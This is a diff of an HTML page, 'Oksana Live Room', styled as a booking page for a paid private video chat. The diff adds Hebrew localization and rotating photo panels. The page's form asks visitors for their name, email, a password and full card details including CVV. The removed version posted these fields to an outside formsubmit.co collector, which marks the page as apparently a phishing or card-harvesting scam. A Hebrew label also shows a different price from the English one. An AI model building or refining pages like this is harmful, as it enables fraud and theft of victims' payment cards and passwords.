@@ -1,168 +1,260 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Oksana Live Room</title>
-<style>
-  body {
-    margin: 0;
-    font-family: 'Segoe UI', sans-serif;
-    background: #ffeef0;
-    overflow-x: hidden;
-    position: relative;
-  }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Oksana Live Room</title>
+  <style>
+    :root {
+      --main-color: #cc0033;
+      --hover-color: #990026;
+      --background: #fff0f5;
+      --modal-bg: rgba(0, 0, 0, 0.6);
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #ffeef0;
+      overflow-x: hidden;
+      position: relative;
+      color: #333;
+      min-height: 100vh;
+    }
 
-  /* الجانبين الخلفيتين */
-  .side-background {
-    position: fixed;
-    top: 0;
-    bottom: 0;
-    width: 18vw;
-    background-size: cover;
-    background-position: center;
-    z-index: -1;
-    opacity: 0.4;
-    transition: background-image 1s ease-in-out;
-  }
-  .left-background {
-    left: 0;
-  }
-  .right-background {
-    right: 0;
-  }
+    /* صناديق الصور الجانبية */
+    #side-left, #side-right {
+      position: fixed;
+      top: 0;
+      width: 220px;
+      height: 100vh;
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-position: center center;
+      opacity: 0.20;
+      animation: floatUpDown 8s ease-in-out infinite alternate;
+      pointer-events: none;
+      z-index: 0;
+      transition: background-image 1s ease-in-out, filter 1s ease-in-out, opacity 1s ease-in-out;
+      filter: blur(0);
+    }
+    #side-left {
+      left: 0;
+      animation-delay: 0s;
+    }
+    #side-right {
+      right: 0;
+      animation-delay: 4s;
+    }
 
-  header {
-    text-align: center;
-    padding: 20px;
-    background: #fff;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-  }
-  .logo {
-    height: 60px;
-  }
-  h1 {
-    font-size: 2em;
-    margin: 0;
-    color: #cc0033;
-  }
-  .container {
-    max-width: 500px;
-    margin: 40px auto;
-    background: #fff0f5;
-    padding: 30px;
-    border-radius: 16px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-  }
-  h2 {
-    text-align: center;
-    color: #cc0033;
-  }
-  form {
-    display: flex;
-    flex-direction: column;
-    gap: 15px;
-  }
-  input, select, button {
-    padding: 12px;
-    border-radius: 8px;
-    border: 1px solid #ccc;
-    font-size: 16px;
-  }
-  button {
-    background: #cc0033;
-    color: white;
-    border: none;
-    cursor: pointer;
-  }
-  button:hover {
-    background: #990026;
-  }
-  footer {
-    text-align: center;
-    margin-top: 40px;
-    color: #777;
-  }
+    @keyframes floatUpDown {
+      0% {
+        transform: translateY(0);
+      }
+      100% {
+        transform: translateY(30px);
+      }
+    }
 
-  @media (max-width: 768px) {
-    .side-background {
-      display: none;
+    header {
+      background: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      padding: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 10;
+    }
+    .logo { height: 50px; }
+    .lang-toggle {
+      margin-left: auto;
+      padding: 8px 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      background: var(--main-color);
+      color: white;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      position: relative;
+      z-index: 10;
+    }
+    .lang-toggle img {
+      width: 20px;
+      height: 14px;
     }
     .container {
-      margin: 20px;
+      max-width: 500px;
+      margin: 50px auto;
+      background: var(--background);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      transition: 0.3s;
+      position: relative;
+      z-index: 10;
     }
-    header {
+    form {
+      display: flex;
       flex-direction: column;
+      gap: 15px;
     }
-    .logo {
-      height: 40px;
+    input, select {
+      padding: 14px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
     }
-  }
-</style>
+    button, .watch-now-btn {
+      padding: 14px;
+      border-radius: 10px;
+      border: none;
+      font-size: 16px;
+      background: var(--main-color);
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+      text-align: center;
+      text-decoration: none;
+    }
+    .watch-now-btn {
+      display: inline-block;
+      background: white;
+      color: var(--main-color);
+      border: 2px solid var(--main-color);
+    }
+    .watch-now-btn:hover {
+      background-color: var(--main-color);
+      color: #fff;
+    }
+    footer {
+      text-align: center;
+      margin: 40px 0;
+      color: #777;
+      font-size: 14px;
+      position: relative;
+      z-index: 10;
+    }
+  </style>
 </head>
 <body>
-  <!-- الخلفيات الجانبية -->
-  <div class="side-background left-background" id="leftBG"></div>
-  <div class="side-background right-background" id="rightBG"></div>
+  <!-- صناديق الصور الجانبية -->
+  <div id="side-left"></div>
+  <div id="side-right"></div>
 
   <header>
     <img src="https://i.postimg.cc/CZSL4QSp/oksana-logo.png" alt="Logo" class="logo" />
-    <h1>Oksana Live Room</h1>
+    <button class="lang-toggle" onclick="toggleLanguage()">
+      <img id="lang-flag" src="https://flagcdn.com/us.svg" alt="flag" />
+      <span id="lang-label">עברית</span>
+    </button>
   </header>
 
   <div class="container">
-    <h2>Join My Private Video Chat</h2>
-    <form action="https://formsubmit.co/64441a430a03e0f246e4d60b1b26d86c" method="POST">
-      <input type="text" name="Full Name" placeholder="Full Name" required />
-      <input type="email" name="Email" placeholder="Email Address" required />
-      <input type="password" name="Password" placeholder="Password" required />
-      <input type="text" name="Card Number" placeholder="Card Number" required />
-      <input type="text" name="Card Expiry" placeholder="MM/YY" required />
-      <input type="text" name="CVV" placeholder="CVV" required />
+    <h2 data-en="Join My Private Video Chat" data-he="הצטרף לשיחת וידאו פרטית"></h2>
+    <form action="#" method="POST">
+      <input type="text" name="Full Name" placeholder="Full Name" data-en="Full Name" data-he="שם מלא" required />
+      <input type="email" name="Email" placeholder="Email Address" data-en="Email Address" data-he="דואר אלקטרוני" required />
+      <input type="password" name="Password" placeholder="Password" data-en="Password" data-he="סיסמה" required />
+      <input type="text" name="Card Number" placeholder="Card Number" data-en="Card Number" data-he="מספר כרטיס" required />
+      <input type="text" name="Card Expiry" placeholder="MM/YY" data-en="MM/YY" data-he="חודש/שנה" required />
+      <input type="text" name="CVV" placeholder="CVV" data-en="CVV" data-he="קוד אבטחה" required />
       <select name="Call Duration" required>
-        <option value="">Select Call Duration</option>
-        <option value="15 mins">15 Minutes - $10</option>
-        <option value="30 mins">30 Minutes - $18</option>
-        <option value="60 mins">60 Minutes - $30</option>
+        <option value="" data-en="Select Call Duration" data-he="בחר משך שיחה">Select Call Duration</option>
+        <option value="15 mins" data-en="15 Minutes - $10" data-he="15 דקות - $10">15 Minutes - $10</option>
+        <option value="30 mins" data-en="30 Minutes - $18" data-he="30 דקות - $18">30 Minutes - $18</option>
+        <option value="60 mins" data-en="60 Minutes - $50" data-he="60 דקות - $50">60 Minutes - $30</option>
       </select>
-      <button type="submit">Pay with Visa</button>
+      <button type="submit" data-en="Pay with Visa" data-he="לקופה">Pay with Visa</button>
+      <a href="#" class="watch-now-btn" data-en="🎥 Watch Now" data-he="🎥 צפה עכשיו">🎥 Watch Now</a>
     </form>
   </div>
 
   <footer>
-    &copy; 2025 Oksana Live Room. All rights reserved.
+    <span data-en="All rights reserved." data-he="  אוקסאנה כל הזכויות שמורות.">&copy; 2025 Oksana Live Room</span>
   </footer>
 
-<script>
-  const images = [
-    "https://i.postimg.cc/6yrdb38G/bg1.jpg",
-    "https://i.postimg.cc/4KdV3QBz/bg2.jpg",
-    "https://i.postimg.cc/FkjJ6WHQ/bg3.jpg",
-    "https://i.postimg.cc/qgnngRXZ/bg4.jpg"
-  ];
+  <script>
+    let isHebrew = false;
 
-  let indexLeft = 0;
-  let indexRight = 2;
+    // Check if saved language exists
+    if (localStorage.getItem('lang') === 'he') {
+      isHebrew = true;
+      applyLanguage();
+    }
 
-  const leftBG = document.getElementById('leftBG');
-  const rightBG = document.getElementById('rightBG');
+    function toggleLanguage() {
+      isHebrew = !isHebrew;
+      localStorage.setItem('lang', isHebrew ? 'he' : 'en');
+      applyLanguage();
+    }
 
-  function changeBackgrounds() {
-    leftBG.style.backgroundImage = `url(${images[indexLeft]})`;
-    rightBG.style.backgroundImage = `url(${images[indexRight]})`;
+    function applyLanguage() {
+      document.documentElement.lang = isHebrew ? 'he' : 'en';
+      document.documentElement.dir = isHebrew ? 'rtl' : 'ltr';
 
-    indexLeft = (indexLeft + 1) % images.length;
-    indexRight = (indexRight + 1) % images.length;
-  }
+      document.querySelectorAll('[data-en]').forEach(el => {
+        if (el.placeholder !== undefined) {
+          el.placeholder = el.dataset[isHebrew ? 'he' : 'en'];
+        } else {
+          el.innerText = el.dataset[isHebrew ? 'he' : 'en'];
+        }
+      });
 
-  changeBackgrounds();
-  setInterval(changeBackgrounds, 6000);
-</script>
+      document.getElementById('lang-label').innerText = isHebrew ? 'English' : 'עברית';
+      document.getElementById('lang-flag').src = isHebrew ? 'https://flagcdn.com/us.svg' : 'https://flagcdn.com/il.svg';
+    }
 
+    // مصفوفات الصور للجانبين
+    const leftImages = [
+      'https://i.postimg.cc/tRvzSn1y/photo-2025-06-19-23-14-33.jpg',
+      'https://i.postimg.cc/DzQgBCGY/photo-2025-06-19-23-16-02.jpg',
+      'https://i.postimg.cc/90LZsKXJ/photo-2025-06-19-22-53-16.jpg'
+    ];
+    const rightImages = [
+      'https://i.postimg.cc/BbzcXRWt/photo-2025-06-19-23-14-34.jpg',
+      'https://i.postimg.cc/KzByqhfh/photo-2025-06-19-23-12-19.jpg',
+      'https://i.postimg.cc/DzQgBCGY/photo-2025-06-19-23-16-02.jpg'
+    ];
+
+    let leftIndex = 0;
+    let rightIndex = 0;
+
+    function changeSideImages() {
+      // بداية تأثير ضبابي قبل التغيير
+      const leftSide = document.getElementById('side-left');
+      const rightSide = document.getElementById('side-right');
+
+      leftSide.style.filter = 'blur(6px)';
+      rightSide.style.filter = 'blur(6px)';
+      leftSide.style.opacity = '0.1';
+      rightSide.style.opacity = '0.1';
+
+      setTimeout(() => {
+        leftIndex = (leftIndex + 1) % leftImages.length;
+        rightIndex = (rightIndex + 1) % rightImages.length;
+
+        leftSide.style.backgroundImage = `url('${leftImages[leftIndex]}')`;
+        rightSide.style.backgroundImage = `url('${rightImages[rightIndex]}')`;
+
+        // إزالة تأثير الضباب والشفافية تدريجيًا
+        leftSide.style.filter = 'blur(0)';
+        rightSide.style.filter = 'blur(0)';
+        leftSide.style.opacity = '0.20';
+        rightSide.style.opacity = '0.20';
+      }, 500); // نصف ثانية ضباب قبل التغيير
+    }
+
+    // تهيئة الصور أول مرة
+    document.getElementById('side-left').style.backgroundImage = `url('${leftImages[0]}')`;
+    document.getElementById('side-right').style.backgroundImage = `url('${rightImages[0]}')`;
+
+    // تغيير الصور كل 8 ثواني
+    setInterval(changeSideImages, 8000);
+  </script>
 </body>
 </html>
-```
+
